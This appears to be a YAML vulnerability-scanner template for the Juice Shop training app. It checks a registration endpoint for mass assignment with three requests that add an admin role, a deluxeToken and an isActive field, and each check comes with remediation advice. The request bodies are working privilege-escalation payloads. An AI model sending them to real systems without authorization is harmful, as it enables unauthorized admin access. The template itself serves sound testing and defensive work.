id: juice-shop-mass-assignment
info:
  name: Mass Assignment Privilege Escalation
  description: Registration endpoint accepts role parameter allowing admin account creation
  owasp_category: A01:2025
  severity: critical
  tags:
    - business-logic
    - mass-assignment
    - privilege-escalation

requests:
  - name: Register with admin role
    method: POST
    path: /api/Users/
    headers:
      Content-Type: application/json
    body: '{"email": "massassign{{rand_int()}}@test.local", "password": "Test1234!", "passwordRepeat": "Test1234!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "role": "admin"}'
    matchers:
      - type: json
        selector: "$.data.role"
        condition: equals
        value: admin
    on_match:
      vulnerability: MASS_ASSIGNMENT
      message: User registration accepts role parameter - privilege escalation to admin possible
      remediation: Use allow-list for accepted fields; never bind user input directly to internal fields like role

  - name: Register with deluxeToken
    method: POST
    path: /api/Users/
    headers:
      Content-Type: application/json
    body: '{"email": "massassign{{rand_int()}}@test.local", "password": "Test1234!", "passwordRepeat": "Test1234!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "deluxeToken": "privilegedToken123"}'
    matchers:
      - type: json
        selector: "$.data.deluxeToken"
        condition: exists
    on_match:
      vulnerability: MASS_ASSIGNMENT
      message: Registration accepts deluxeToken parameter - privilege escalation possible
      remediation: Implement strict input validation; only allow explicitly whitelisted fields

  - name: Register with isActive override
    method: POST
    path: /api/Users/
    headers:
      Content-Type: application/json
    body: '{"email": "massassign{{rand_int()}}@test.local", "password": "Test1234!", "passwordRepeat": "Test1234!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "isActive": false}'
    matchers:
      - type: json
        selector: "$.data.isActive"
        condition: exists
    on_match:
      vulnerability: MASS_ASSIGNMENT
      message: Registration accepts isActive parameter - account status manipulation possible
      remediation: Never bind request body directly to model; use DTO pattern with explicit field mapping
